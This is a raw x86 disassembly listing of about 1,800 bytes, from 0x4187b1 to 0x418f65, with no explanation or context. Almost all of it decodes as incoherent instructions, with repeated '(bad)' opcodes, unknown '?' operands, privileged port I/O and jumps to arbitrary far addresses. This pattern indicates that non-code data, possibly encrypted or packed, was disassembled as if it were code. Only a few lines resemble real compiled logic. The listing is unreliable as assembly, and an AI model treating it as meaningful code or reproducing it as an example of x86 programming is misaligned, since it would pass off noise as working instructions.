  4187b1:	cmp    dh,BYTE PTR [edx+0x54]
  4187b4:	or     DWORD PTR [edi-0x37],ebp
  4187b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4187b8:	inc    edx
  4187b9:	cmp    al,0x12
  4187bb:	push   es
  4187bc:	ficom  DWORD PTR [edi+ecx*4+0x74f3c894]
  4187c3:	mov    WORD PTR [esi-0x7c],?
  4187c6:	shl    edx,1
  4187c8:	push   ecx
  4187c9:	push   esp
  4187ca:	pushf  
  4187cb:	nop
  4187cc:	push   cs
  4187cd:	ret    
  4187ce:	ror    edi,0xbe
  4187d1:	repnz outs dx,DWORD PTR ds:[esi]
  4187d3:	outs   dx,BYTE PTR ds:[esi]
  4187d4:	adc    edi,0x299653a4
  4187da:	leave  
  4187db:	add    al,0x31
  4187dd:	jmp    0x4187fe
  4187df:	or     al,0xfc
  4187e1:	ins    BYTE PTR es:[edi],dx
  4187e2:	adc    ebp,DWORD PTR [ebx+0x61]
  4187e5:	push   es
  4187e6:	pop    ds
  4187e7:	adc    ebx,DWORD PTR [ebx-0x56]
  4187ea:	pop    edi
  4187eb:	pop    ebp
  4187ec:	xor    DWORD PTR [ebx],0xbf3888c7
  4187f2:	add    bl,al
  4187f4:	xchg   DWORD PTR [edx],edi
  4187f6:	and    al,0x2f
  4187f8:	retf   0x2a7f
  4187fb:	int3   
  4187fc:	(bad)  
  4187fe:	push   ecx
  4187ff:	xchg   ebx,eax
  418800:	rcr    BYTE PTR [ebp+0xe],cl
  418803:	je     0x41883b
  418805:	bswap  esp
  418807:	xor    eax,0x41db6458
  41880c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41880d:	fucom  st(2)
  41880f:	push   ebx
  418810:	jg     0x41887e
  418812:	xchg   ebp,eax
  418813:	lock or BYTE PTR [esi+0x325e0115],0xb3
  41881b:	rol    BYTE PTR [ebx],cl
  41881d:	loopne 0x4187ba
  41881f:	loope  0x418807
  418821:	cmp    BYTE PTR [esi-0x27b3f189],al
  418827:	retf   0x9cc4
  41882a:	into   
  41882b:	ja     0x41882e
  41882d:	je     0x4187f1
  41882f:	and    BYTE PTR [edi-0x43909f0b],0xa9
  418836:	cmp    DWORD PTR [ebp+0x75024541],ecx
  41883c:	or     edi,DWORD PTR [ebx+0x2b0ba83f]
  418842:	push   edi
  418843:	out    dx,al
  418844:	shl    DWORD PTR cs:[ecx+0x5492101a],cl
  41884b:	add    ch,BYTE PTR [ebp+0x3d3927ac]
  418851:	lock arpl WORD PTR [eax],bp
  418854:	push   es
  418855:	adc    bl,ch
  418857:	outs   dx,BYTE PTR ds:[esi]
  418858:	ror    DWORD PTR [ecx-0x87c1db7],cl
  41885e:	push   edx
  41885f:	int    0xe6
  418861:	push   esp
  418862:	cmp    eax,0x754e537f
  418867:	push   edx
  418868:	cdq    
  418869:	and    BYTE PTR [esi],0xfd
  41886c:	jl     0x4188b9
  41886e:	jp     0x418801
  418870:	inc    ebp
  418871:	mov    eax,ds:0x86c2798d
  418876:	sub    ah,0x2c
  418879:	imul   edi,DWORD PTR [ebx+ecx*4],0xb6953712
  418880:	ror    BYTE PTR [edx-0x2b],cl
  418883:	(bad)  
  418884:	xor    al,0x5e
  418886:	(bad)  
  418887:	aam    0x2c
  418889:	ret    
  41888a:	xchg   esp,eax
  41888b:	ins    DWORD PTR es:[edi],dx
  41888c:	add    eax,edx
  41888e:	mov    ecx,0x34441af7
  418893:	jmp    0x65449442
  418898:	pop    ds
  418899:	add    bh,dl
  41889b:	sub    al,0x5b
  41889d:	(bad)  
  41889e:	retf   0x1c99
  4188a1:	jecxz  0x4188ce
  4188a3:	arpl   WORD PTR [eax+ecx*8-0x32],bx
  4188a7:	pop    ds
  4188a8:	test   BYTE PTR [edi+0x3f],dl
  4188ab:	out    dx,eax
  4188ac:	xchg   edx,eax
  4188ad:	sbb    eax,0xcc2f7de2
  4188b2:	repnz test al,0xaa
  4188b5:	in     eax,dx
  4188b6:	pop    edi
  4188b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4188b8:	add    cl,cl
  4188ba:	or     al,0x2d
  4188bc:	xor    BYTE PTR [ebp+0x5d94822],0x32
  4188c3:	xor    edi,DWORD PTR [edi-0x50d9cff2]
  4188c9:	pop    esp
  4188ca:	sbb    DWORD PTR [ecx],eax
  4188cc:	xchg   ebx,eax
  4188cd:	or     BYTE PTR [ecx+0x5b],ch
  4188d0:	ins    DWORD PTR es:[edi],dx
  4188d1:	push   ss
  4188d2:	std    
  4188d3:	xor    DWORD PTR [ebp+0x57],esp
  4188d6:	push   es
  4188d7:	xchg   ecx,eax
  4188d8:	ds out dx,al
  4188da:	jmp    0x2689:0x6a4de16a
  4188e1:	popf   
  4188e2:	pop    es
  4188e3:	retf   
  4188e4:	shufps xmm4,XMMWORD PTR [esi],0xf6
  4188e8:	scas   eax,DWORD PTR es:[edi]
  4188e9:	les    eax,FWORD PTR [edx-0x2a]
  4188ec:	cmc    
  4188ed:	(bad)  [edx-0x57]
  4188f0:	clc    
  4188f1:	sub    al,0x50
  4188f3:	retf   
  4188f4:	and    bh,BYTE PTR [edx+0x60]
  4188f7:	repnz fisttp WORD PTR [ebp-0x26]
  4188fb:	js     0x418928
  4188fd:	lods   eax,DWORD PTR ds:[esi]
  4188fe:	popa   
  4188ff:	and    al,0x35
  418901:	fbld   TBYTE PTR [esi+0x698b4782]
  418907:	lds    ecx,FWORD PTR [edx-0x752b88c7]
  41890d:	mov    al,0xb0
  41890f:	pop    ecx
  418910:	(bad)  
  418912:	sub    BYTE PTR [ecx],bl
  418914:	mov    edi,0x907b2b5b
  418919:	inc    esi
  41891a:	or     al,0x12
  41891c:	enter  0x6bf6,0xbf
  418920:	mov    ds:0x8fb579eb,eax
  418925:	cmp    ecx,DWORD PTR [edi]
  418927:	aas    
  418928:	add    BYTE PTR [edx+0x7cb3d3f8],dl
  41892e:	outs   dx,BYTE PTR ds:[esi]
  41892f:	pop    esp
  418930:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418931:	mov    fs,WORD PTR ds:0x33c0466f
  418937:	mov    al,ds:0x539862a9
  41893c:	cmp    BYTE PTR [ebx-0xeaa89c0],ch
  418942:	push   esi
  418943:	xlat   BYTE PTR ds:[ebx]
  418944:	into   
  418945:	cmp    al,0x7a
  418947:	out    dx,al
  418948:	retf   
  418949:	mov    eax,0xd5bb5fd5
  41894e:	(bad)  
  41894f:	mov    fs,WORD PTR [edi+0x5ea22692]
  418955:	dec    esp
  418956:	cmp    al,0x39
  418958:	mov    BYTE PTR [edi+0x500ebedc],0xed
  41895f:	adc    al,0x7
  418961:	or     al,0x7b
  418963:	dec    esi
  418964:	pop    ebp
  418965:	shl    DWORD PTR [ecx],cl
  418967:	push   ebp
  418968:	in     al,dx
  418969:	or     BYTE PTR [ecx-0x2127db52],dh
  41896f:	mov    ds:0x9770256c,al
  418974:	inc    edi
  418975:	mov    ah,0x6d
  418977:	loopne 0x41898e
  418979:	pop    esp
  41897a:	sbb    BYTE PTR [edi-0x37],0x25
  41897e:	out    dx,eax
  41897f:	sar    DWORD PTR [ecx+0x3b],cl
  418982:	cmp    bh,BYTE PTR [ecx-0x593967c1]
  418988:	test   ah,ch
  41898a:	popa   
  41898b:	das    
  41898c:	fcomp  DWORD PTR [eax+0x76]
  41898f:	in     eax,dx
  418990:	cdq    
  418991:	pop    ss
  418992:	xor    cl,bl
  418994:	jmp    0x418922
  418996:	push   edx
  418997:	adc    BYTE PTR [ebx+0x1aa4f849],bh
  41899d:	jmp    0x4189a0
  41899f:	add    ch,BYTE PTR [ebp+edx*2-0x4acb1294]
  4189a6:	adc    dh,BYTE PTR [edx+0x7fb4bc1c]
  4189ac:	xor    DWORD PTR [ecx-0x7528883c],0x1212a0b7
  4189b6:	sub    BYTE PTR [ebp+0x28],bh
  4189b9:	test   DWORD PTR [edx+0x64],ebx
  4189bc:	ret    0x9864
  4189bf:	pop    es
  4189c0:	jmp    0x41899d
  4189c2:	cwde   
  4189c3:	jl     0x4189d6
  4189c5:	mov    bh,bh
  4189c7:	jl     0x4189aa
  4189c9:	lods   al,BYTE PTR ds:[esi]
  4189ca:	adc    eax,0xaf16c221
  4189cf:	inc    esi
  4189d0:	lds    edx,FWORD PTR [edi+0x1c05d144]
  4189d6:	test   eax,esi
  4189d8:	sbb    eax,0xcf66f11c
  4189dd:	les    edi,FWORD PTR [edi-0x50386a43]
  4189e3:	and    bl,BYTE PTR [ebx+0x610ae3cd]
  4189e9:	aam    0xf
  4189eb:	gs xchg ebx,eax
  4189ed:	int    0x6b
  4189ef:	adc    BYTE PTR [esi-0x5491342a],ch
  4189f5:	imul   ecx,DWORD PTR [ebx-0x3543e05b],0x29
  4189fc:	mov    dl,0xf9
  4189fe:	pop    ds
  4189ff:	ins    BYTE PTR es:[edi],dx
  418a00:	ja     0x4189d7
  418a02:	ds xchg ebp,eax
  418a04:	inc    esi
  418a05:	cwde   
  418a06:	ins    BYTE PTR es:[edi],dx
  418a07:	int3   
  418a08:	lahf   
  418a09:	addr16 jns 0x4189dc
  418a0c:	mov    dh,0x2c
  418a0e:	or     eax,0x48ce9649
  418a13:	shl    BYTE PTR [eax+ebx*4+0x74],1
  418a17:	or     eax,0xeb98ca7e
  418a1c:	mov    WORD PTR [ebx+0x42],gs
  418a1f:	pop    edi
  418a20:	mov    eax,DWORD PTR [ebp+0xc]
  418a23:	xor    eax,ecx
  418a25:	mov    ecx,DWORD PTR [ebp-0x8]
  418a28:	add    eax,edx
  418a2a:	imul   eax,ecx
  418a2d:	jmp    0x41adec
  418a32:	clc    
  418a33:	loope  0x4189be
  418a35:	mov    ah,0x87
  418a37:	test   bl,al
  418a39:	mov    ebp,0x3e8f68ea
  418a3e:	(bad)  
  418a3f:	push   cs
  418a40:	jae    0x418abc
  418a42:	cmp    DWORD PTR [edi],ebx
  418a44:	popa   
  418a45:	(bad)  
  418a46:	rcr    BYTE PTR [edi+0x62],0x62
  418a4a:	fs sbb eax,0x44691e62
  418a50:	sub    eax,0xa3495ec6
  418a55:	ja     0x418ad2
  418a57:	fstp   DWORD PTR gs:[edx+0x20232ee3]
  418a5e:	push   ss
  418a5f:	call   0x39b986dd
  418a64:	(bad)  
  418a65:	xchg   ebp,eax
  418a66:	inc    esi
  418a67:	in     eax,0x7d
  418a69:	and    eax,0xc77d4685
  418a6e:	dec    ebp
  418a6f:	jg     0x418aec
  418a71:	ret    0x9b3b
  418a74:	cmp    al,0xc7
  418a76:	iret   
  418a77:	and    eax,0xda36af04
  418a7c:	in     eax,dx
  418a7d:	jns    0x418a40
  418a7f:	xchg   edi,eax
  418a80:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418a81:	ror    DWORD PTR [edx-0x71],0xbd
  418a85:	outs   dx,DWORD PTR ds:[esi]
  418a86:	rcr    DWORD PTR [edx+0x3],cl
  418a89:	inc    eax
  418a8a:	dec    edx
  418a8b:	jo     0x418ae3
  418a8d:	repnz loope 0x418ac1
  418a90:	pop    esp
  418a91:	pushf  
  418a92:	or     eax,0x2b982f05
  418a97:	xor    DWORD PTR [ebp+0x211a2b36],esi
  418a9d:	(bad)  
  418a9e:	jp     0x418ab1
  418aa0:	call   0x639b:0x2fb81ced
  418aa7:	test   esp,esi
  418aa9:	xchg   esi,eax
  418aaa:	hlt    
  418aab:	xor    DWORD PTR [edi+0x2],ebp
  418aae:	icebp  
  418aaf:	jg     0x418ac9
  418ab1:	pushf  
  418ab2:	mov    cl,0x6
  418ab4:	pop    es
  418ab5:	xchg   ebp,edi
  418ab7:	rol    DWORD PTR [eax+edi*4+0x17962d52],cl
  418abe:	in     al,dx
  418abf:	pop    ds
  418ac0:	mov    ebx,0x2ea0bce4
  418ac5:	sub    BYTE PTR [ebp+ecx*4-0x1b08421d],0x9e
  418acd:	mov    eax,0xa5facf61
  418ad2:	fstp   QWORD PTR es:[esi]
  418ad5:	jbe    0x418b37
  418ad7:	aas    
  418ad8:	aam    0x11
  418ada:	adc    eax,0xbb9670a3
  418adf:	not    DWORD PTR [ecx+0x60]
  418ae2:	hlt    
  418ae3:	loopne 0x418aa1
  418ae5:	push   edx
  418ae6:	add    bh,BYTE PTR [esi]
  418ae8:	jg     0x418aaf
  418aea:	xchg   DWORD PTR [ecx-0x23],ecx
  418aed:	mov    bl,bh
  418aef:	dec    ebx
  418af0:	dec    BYTE PTR [ecx-0x69]
  418af3:	aam    0x23
  418af5:	daa    
  418af6:	xchg   edx,eax
  418af7:	push   esi
  418af8:	lahf   
  418af9:	jb     0x418b51
  418afb:	cmp    al,0x99
  418afd:	cdq    
  418afe:	rcl    BYTE PTR [edx-0x73],cl
  418b01:	fbstp  TBYTE PTR [ebx-0x2b]
  418b04:	imul   DWORD PTR [edx]
  418b06:	or     esi,DWORD PTR [ecx]
  418b08:	mov    ebp,0x1ef3705e
  418b0d:	sbb    DWORD PTR ds:0x979f466,0x1f278bef
  418b17:	daa    
  418b18:	test   DWORD PTR [esi],ebx
  418b1a:	rcl    DWORD PTR [ebx],1
  418b1c:	sahf   
  418b1d:	dec    edi
  418b1e:	bound  esi,QWORD PTR [edi-0x145d6335]
  418b24:	mov    BYTE PTR [edi],cl
  418b26:	and    eax,0x99cc1fc8
  418b2b:	dec    ecx
  418b2c:	in     al,dx
  418b2d:	jbe    0x418ad6
  418b2f:	pushf  
  418b30:	add    eax,DWORD PTR [esi]
  418b32:	dec    esi
  418b33:	add    DWORD PTR [eax+0x16],ebx
  418b36:	sbb    ebx,DWORD PTR [eax]
  418b38:	ror    DWORD PTR [edi-0x57],0x6e
  418b3c:	in     al,0x7e
  418b3e:	dec    esp
  418b3f:	ret    
  418b40:	in     al,0xb9
  418b42:	cli    
  418b43:	jg     0x418b85
  418b45:	sub    al,0xb9
  418b47:	mov    esi,0x3322084a
  418b4c:	repz gs sbb eax,0x9d95731c
  418b53:	ja     0x418b05
  418b55:	add    ah,dh
  418b57:	adc    ah,BYTE PTR ds:0xa238374d
  418b5d:	lods   eax,DWORD PTR ds:[esi]
  418b5e:	push   0xffffffee
  418b60:	bound  esp,QWORD PTR [ebx+0x64]
  418b63:	and    DWORD PTR [edi],ebx
  418b65:	rol    cl,0xba
  418b68:	push   ecx
  418b69:	mov    ah,BYTE PTR [esi+esi*4+0x18b87993]
  418b70:	pusha  
  418b71:	das    
  418b72:	jl     0x418b7a
  418b74:	push   ebp
  418b75:	das    
  418b76:	ds or  bh,dl
  418b79:	push   ecx
  418b7a:	xor    ebx,DWORD PTR [ebp+0x17]
  418b7d:	jne    0x418bd7
  418b7f:	hlt    
  418b80:	push   ebp
  418b81:	jg     0x418bb2
  418b83:	mov    ecx,0xcd30a4f0
  418b88:	add    dl,BYTE PTR [eax]
  418b8a:	and    al,0x4c
  418b8c:	pop    esi
  418b8d:	stos   BYTE PTR es:[edi],al
  418b8e:	aas    
  418b8f:	dec    ebp
  418b90:	lahf   
  418b91:	jl     0x418be0
  418b93:	mov    al,ds:0x2395aa82
  418b98:	mov    ecx,0x666b9cc1
  418b9d:	sub    al,0xf6
  418b9f:	push   edx
  418ba0:	mov    bl,0xed
  418ba2:	and    DWORD PTR ds:0xa5455897,ebp
  418ba8:	rol    BYTE PTR [ecx],0x7d
  418bab:	mov    bh,dh
  418bad:	aas    
  418bae:	test   DWORD PTR [ebx+0x7821d313],0x569d1649
  418bb8:	in     eax,dx
  418bb9:	aas    
  418bba:	adc    BYTE PTR [ecx+eiz*1+0x44],cl
  418bbe:	mov    edx,0xa737a34d
  418bc3:	xchg   ebx,eax
  418bc4:	inc    eax
  418bc5:	retf   
  418bc6:	or     ah,BYTE PTR [esi+0x15]
  418bc9:	loope  0x418c19
  418bcb:	mov    al,0x7e
  418bcd:	stos   DWORD PTR es:[edi],eax
  418bce:	sar    BYTE PTR [edi+eiz*4+0x6d6fe18d],0x68
  418bd6:	std    
  418bd7:	repnz ds push esp
  418bda:	popf   
  418bdb:	out    dx,al
  418bdc:	ins    BYTE PTR es:[edi],dx
  418bdd:	mov    ebp,0xa0ef3704
  418be2:	pop    ebx
  418be3:	in     al,dx
  418be4:	lods   al,BYTE PTR ds:[esi]
  418be5:	pop    ds
  418be6:	int3   
  418be7:	int    0x15
  418be9:	loopne 0x418bc0
  418beb:	stos   DWORD PTR es:[edi],eax
  418bec:	add    eax,0xca68ae7
  418bf1:	ins    BYTE PTR es:[edi],dx
  418bf2:	push   ss
  418bf3:	ins    BYTE PTR es:[edi],dx
  418bf4:	fwait
  418bf5:	dec    ebx
  418bf6:	inc    ecx
  418bf7:	call   0xe09bf9f8
  418bfc:	cmp    BYTE PTR [edx+0x4a],dl
  418bff:	pop    ebx
  418c00:	je     0x418ba3
  418c02:	enter  0xbd44,0x7a
  418c06:	int    0xa2
  418c08:	push   esp
  418c09:	jl     0x418bee
  418c0b:	je     0x418bfc
  418c0d:	sub    ah,BYTE PTR [ebx+0x702f9300]
  418c13:	and    al,0xf5
  418c15:	and    al,0x3a
  418c17:	inc    esi
  418c18:	xor    ch,BYTE PTR [ebx+ebx*4+0x14101fd1]
  418c1f:	aaa    
  418c20:	in     al,dx
  418c21:	leave  
  418c22:	fs sub bl,0x61
  418c26:	cmp    eax,0x4628e425
  418c2b:	xor    esp,DWORD PTR ds:0xdc2f5f5
  418c31:	mov    edi,0x985b8bae
  418c36:	retf   0x80d8
  418c39:	mov    ch,0x3a
  418c3b:	mov    edi,DWORD PTR [esi]
  418c3d:	frstor [esi]
  418c3f:	mov    ecx,0x8329cb35
  418c44:	js     0x418c55
  418c46:	xchg   edi,eax
  418c47:	in     al,dx
  418c48:	xchg   BYTE PTR [ebx-0x2d1774c6],dh
  418c4e:	test   eax,0x5e80950e
  418c53:	push   ebx
  418c54:	ss jb  0x418ccd
  418c57:	sbb    edx,DWORD PTR [eax+0x74a16b6a]
  418c5d:	cmp    DWORD PTR [ebx+0x2f],0xffffff83
  418c61:	add    eax,0xee5f0480
  418c66:	and    esi,DWORD PTR [ebp-0x69]
  418c69:	cdq    
  418c6a:	psrad  mm2,mm1
  418c6d:	mov    eax,0xa17f8f7c
  418c72:	xchg   esi,eax
  418c73:	clc    
  418c74:	mov    edx,0x5b9f680f
  418c79:	mov    edi,0x29630a9b
  418c7e:	test   ch,al
  418c80:	clc    
  418c81:	arpl   dx,di
  418c83:	mov    bh,0xdf
  418c85:	xchg   ecx,eax
  418c86:	and    BYTE PTR ds:0xe3465d1f,dl
  418c8c:	dec    edi
  418c8d:	sti    
  418c8e:	sbb    cl,BYTE PTR [edi]
  418c90:	or     eax,0xd4bcdfb5
  418c95:	cld    
  418c96:	xor    eax,0xad52c84
  418c9b:	xchg   edi,eax
  418c9c:	xor    DWORD PTR [esi],edi
  418c9e:	shl    esi,cl
  418ca0:	add    dh,al
  418ca2:	xchg   edi,eax
  418ca3:	mov    esi,0xff35de08
  418ca8:	je     0x418d02
  418caa:	push   esi
  418cab:	leave  
  418cac:	sahf   
  418cad:	push   ss
  418cae:	lea    ebp,[edx+eiz*4-0x469c4985]
  418cb5:	xor    cl,BYTE PTR [esi-0x18]
  418cb8:	mov    ch,0x76
  418cba:	xchg   ecx,eax
  418cbb:	int    0x43
  418cbd:	ins    BYTE PTR es:[edi],dx
  418cbe:	pop    ss
  418cbf:	lods   eax,DWORD PTR ds:[esi]
  418cc0:	or     DWORD PTR es:[ebx+0x532022fe],esi
  418cc7:	sti    
  418cc8:	fs push 0xfab51f8d
  418cce:	addr16 lahf 
  418cd0:	sub    ecx,DWORD PTR [edx+0x41]
  418cd3:	test   eax,0x9b5353ad
  418cd8:	dec    ebx
  418cd9:	out    0x77,al
  418cdb:	jnp    0x418c9b
  418cdd:	lods   eax,DWORD PTR ds:[esi]
  418cde:	xor    bh,bl
  418ce0:	test   eax,0x6ac2372a
  418ce5:	xchg   DWORD PTR [esi+0x65e1cabf],eax
  418ceb:	stos   BYTE PTR es:[edi],al
  418cec:	dec    esp
  418ced:	lods   al,BYTE PTR ds:[esi]
  418cee:	mov    DWORD PTR [ecx+0x68],eax
  418cf1:	xchg   edi,eax
  418cf2:	shl    DWORD PTR [ebx],0xa9
  418cf5:	xchg   ebp,eax
  418cf6:	jb     0x418cfc
  418cf8:	(bad)  
  418cf9:	fwait
  418cfa:	fwait
  418cfb:	out    dx,eax
  418cfc:	xor    esi,DWORD PTR [ebx+0x4a]
  418cff:	shl    BYTE PTR [eax],cl
  418d01:	pop    ss
  418d02:	int    0x17
  418d04:	lahf   
  418d05:	mov    esp,0x88cc379
  418d0a:	and    DWORD PTR ds:0xf093,eax
  418d0f:	int3   
  418d10:	push   ebp
  418d11:	inc    ecx
  418d12:	dec    esp
  418d13:	jg     0x418d4e
  418d15:	das    
  418d16:	adc    ebx,DWORD PTR [edx+0x2ae072fe]
  418d1c:	sbb    eax,0x1e2f4bc3
  418d21:	dec    esp
  418d22:	inc    edx
  418d23:	xchg   ebx,eax
  418d24:	cmp    ebx,DWORD PTR ds:0x56d3c0b7
  418d2a:	push   edx
  418d2b:	sbb    ebp,DWORD PTR [edi-0x1e79b0a8]
  418d31:	pop    edi
  418d32:	mov    al,ds:0x987bbac7
  418d37:	pusha  
  418d38:	ret    
  418d39:	mov    ecx,0x2f701082
  418d3e:	arpl   WORD PTR [esi+ebp*8-0x3dc08679],bp
  418d45:	div    BYTE PTR ds:0x3b9cd35
  418d4b:	rcr    esp,1
  418d4d:	xchg   esp,eax
  418d4e:	mov    edi,0x1ee061b8
  418d53:	aaa    
  418d54:	mov    ch,0x56
  418d56:	mov    BYTE PTR [esi],dh
  418d58:	xchg   esi,eax
  418d59:	jge    0x418ce1
  418d5b:	pop    edi
  418d5c:	jno    0x418d46
  418d5e:	stos   BYTE PTR es:[edi],al
  418d5f:	hlt    
  418d60:	xor    eax,0x24ce32f1
  418d65:	rcr    DWORD PTR [ecx+0x21],cl
  418d68:	aad    0x2c
  418d6a:	mov    DWORD PTR [esi],edx
  418d6c:	test   al,0x25
  418d6e:	or     edi,DWORD PTR [esi]
  418d70:	dec    ebp
  418d71:	jb     0x418d9a
  418d73:	mov    ?,ebp
  418d75:	add    DWORD PTR [edx],edx
  418d77:	(bad)  
  418d78:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418d79:	in     al,dx
  418d7a:	push   es
  418d7b:	jg     0x418dce
  418d7d:	cdq    
  418d7e:	leave  
  418d7f:	test   DWORD PTR [edx-0x7a],ebx
  418d82:	ret    0xbd2e
  418d85:	call   0x8e50:0x55d8a92
  418d8c:	push   edi
  418d8d:	outs   dx,BYTE PTR ds:[esi]
  418d8e:	pusha  
  418d8f:	xor    edi,edi
  418d91:	pop    ebx
  418d92:	dec    eax
  418d93:	outs   dx,BYTE PTR ds:[esi]
  418d94:	cwde   
  418d95:	xchg   BYTE PTR [ebx+0x1c],ch
  418d98:	or     cl,al
  418d9a:	mov    ebx,0xa0626547
  418d9f:	mov    BYTE PTR [edx+0x7e],bl
  418da2:	or     eax,0x9096daa4
  418da7:	inc    eax
  418da8:	mov    edx,0x15a9df31
  418dad:	inc    edx
  418dae:	(bad)  
  418daf:	push   edi
  418db0:	imul   BYTE PTR fs:[eax+0x3aadc30b]
  418db7:	and    eax,0x65686448
  418dbc:	mov    ah,ah
  418dbe:	out    dx,al
  418dbf:	ficom  WORD PTR [ebp-0x52642303]
  418dc5:	mov    bh,0xfd
  418dc7:	push   ebp
  418dc8:	xchg   edx,eax
  418dc9:	outs   dx,DWORD PTR ds:[esi]
  418dca:	or     esi,esi
  418dcc:	(bad)  
  418dcd:	fwait
  418dce:	cmc    
  418dcf:	adc    BYTE PTR [ecx],bl
  418dd1:	xlat   BYTE PTR ds:[ebx]
  418dd2:	mov    eax,0xa4951ff6
  418dd7:	dec    esp
  418dd8:	pop    ebx
  418dd9:	inc    edi
  418dda:	or     DWORD PTR [edx-0x7b02bb7b],esi
  418de0:	or     dh,BYTE PTR [eax]
  418de2:	sbb    eax,0x1d20148f
  418de7:	mov    cl,BYTE PTR [ecx+0x4428c564]
  418ded:	xor    DWORD PTR [ebx],esi
  418def:	pop    ecx
  418df0:	ss pusha 
  418df2:	outs   dx,DWORD PTR ds:[esi]
  418df3:	mov    dl,0x2b
  418df5:	rcr    DWORD PTR [ebx],cl
  418df7:	daa    
  418df8:	mov    eax,ds:0xd7e8f5b
  418dfd:	cmp    ch,al
  418dff:	retf   0xa1f6
  418e02:	mov    ecx,0x11a7df64
  418e07:	sub    BYTE PTR [esi-0x57],bl
  418e0a:	pop    ss
  418e0b:	xor    DWORD PTR [edx],0xffffff94
  418e0e:	std    
  418e0f:	(bad)  
  418e11:	or     DWORD PTR [ebp-0x1c5dee],0x60
  418e18:	mov    dh,BYTE PTR [edx-0x16]
  418e1b:	jb     0x418e17
  418e1d:	js     0x418da0
  418e1f:	mov    ebx,0xc05325c0
  418e24:	push   esi
  418e25:	ror    ebp,cl
  418e27:	or     ebx,esp
  418e29:	sar    BYTE PTR [edi],0xaf
  418e2c:	mov    esi,0x333a65c3
  418e31:	(bad)  
  418e32:	xchg   edx,eax
  418e33:	xor    ah,BYTE PTR [eax+esi*4-0x60]
  418e37:	into   
  418e38:	(bad)  
  418e39:	jmp    0x418dde
  418e3b:	into   
  418e3c:	lock addr16 jge 0x418e9a
  418e40:	enter  0x5088,0xe2
  418e44:	pop    edi
  418e45:	jno    0x418e06
  418e47:	inc    edx
  418e48:	xchg   ebp,eax
  418e49:	(bad)  
  418e4a:	sar    BYTE PTR [esp+edi*4],0x62
  418e4e:	and    esp,DWORD PTR [ecx-0x53dab3db]
  418e54:	nop
  418e55:	dec    esi
  418e56:	xchg   esi,eax
  418e57:	sbb    eax,0x13bfed19
  418e5c:	inc    ebx
  418e5d:	dec    esp
  418e5e:	fdivr  DWORD PTR [esi+0x37ab0491]
  418e64:	push   es
  418e65:	xchg   al,ah
  418e67:	jp     0x418e1a
  418e69:	push   esi
  418e6a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418e6b:	xor    eax,0x104e6f4f
  418e70:	inc    BYTE PTR [edx+0x3b43dfb0]
  418e76:	sub    eax,0x3e258dc6
  418e7b:	lods   eax,DWORD PTR ds:[esi]
  418e7c:	fisttp WORD PTR [edi+0x69]
  418e7f:	dec    ebx
  418e80:	and    eax,0x9e8a263f
  418e85:	mov    BYTE PTR [esi-0x2b7f8dd3],dh
  418e8b:	out    0x86,eax
  418e8d:	inc    edi
  418e8e:	and    DWORD PTR [ebx],0xffffffe2
  418e91:	sbb    DWORD PTR [esi+0x6b],ecx
  418e94:	popf   
  418e95:	ret    
  418e96:	sub    dl,BYTE PTR [esi]
  418e98:	mov    ch,0x7f
  418e9a:	fwait
  418e9b:	mov    ecx,0x290c1e0b
  418ea0:	mov    ecx,DWORD PTR [ebx+0x102eb226]
  418ea6:	push   edi
  418ea7:	fnsave [esi+0x20]
  418eaa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418eab:	xor    DWORD PTR [edx],esp
  418ead:	ret    0x14f
  418eb0:	repz cmp DWORD PTR [esi-0x2b48b4f5],esi
  418eb7:	sar    DWORD PTR [edi+edx*8+0x24],1
  418ebb:	ror    DWORD PTR [ebp-0x4b],cl
  418ebe:	fs fcmove st,st(1)
  418ec1:	mov    dl,0xce
  418ec3:	sub    DWORD PTR [ebp+0x1e],edi
  418ec6:	and    esi,DWORD PTR [edx-0x58515eb]
  418ecc:	xchg   DWORD PTR gs:[edi+0x7d65d84],ebp
  418ed3:	into   
  418ed4:	push   ds
  418ed5:	jbe    0x418e85
  418ed7:	mul    BYTE PTR [eax]
  418ed9:	jne    0x418e79
  418edb:	cdq    
  418edc:	popf   
  418edd:	repz fistp DWORD PTR [ebx+ebp*1+0x3b6405bc]
  418ee5:	stos   BYTE PTR es:[edi],al
  418ee6:	inc    ebx
  418ee7:	push   ecx
  418ee8:	retf   0x2fa8
  418eeb:	loope  0x418efa
  418eed:	dec    esp
  418eee:	adc    bh,dh
  418ef0:	jo     0x418f4b
  418ef2:	and    BYTE PTR [edi-0x34d35cd8],cl
  418ef8:	jecxz  0x418f4a
  418efa:	data16 jl 0x418ea6
  418efd:	(bad)  
  418efe:	xchg   ebx,eax
  418eff:	sub    esi,edx
  418f01:	cld    
  418f02:	sub    al,0xec
  418f04:	sar    bl,cl
  418f06:	sbb    BYTE PTR [eax],0xf5
  418f09:	aam    0x22
  418f0b:	data16 lods al,BYTE PTR ds:[esi]
  418f0d:	adc    BYTE PTR [ecx+0x7b8fed78],0x93
  418f14:	mov    bl,0xf7
  418f16:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418f17:	push   cs
  418f18:	mov    edx,0xd6919e4b
  418f1d:	mov    esp,0xe7e37e07
  418f22:	lds    edi,FWORD PTR [ebp-0x3a]
  418f25:	js     0x418eb2
  418f27:	jne    0x418f18
  418f29:	push   ss
  418f2a:	in     eax,0x59
  418f2c:	dec    ebp
  418f2d:	imul   eax,DWORD PTR [edx],0xffffffb6
  418f30:	push   0xffffffff
  418f32:	adc    eax,0xf0be5854
  418f37:	mov    bh,ch
  418f39:	rcr    ebp,1
  418f3b:	fwait
  418f3c:	jbe    0x418f92
  418f3e:	jecxz  0x418f81
  418f40:	test   al,0xac
  418f42:	jns    0x418f02
  418f44:	fcomi  st,st(7)
  418f46:	mov    esi,ds
  418f48:	xchg   esi,eax
  418f49:	mov    ah,0xe3
  418f4b:	sbb    BYTE PTR [ecx+edi*8+0x199d1923],bl
  418f52:	add    al,0x68
  418f54:	mov    edi,0xa75aac14
  418f59:	fdiv   QWORD PTR [eax+0x50dd1e10]
  418f5f:	mov    dh,0x44
  418f61:	fiadd  DWORD PTR [ebp+0x37]
  418f64:	sahf   
  418f65:	loopne 0x418f44
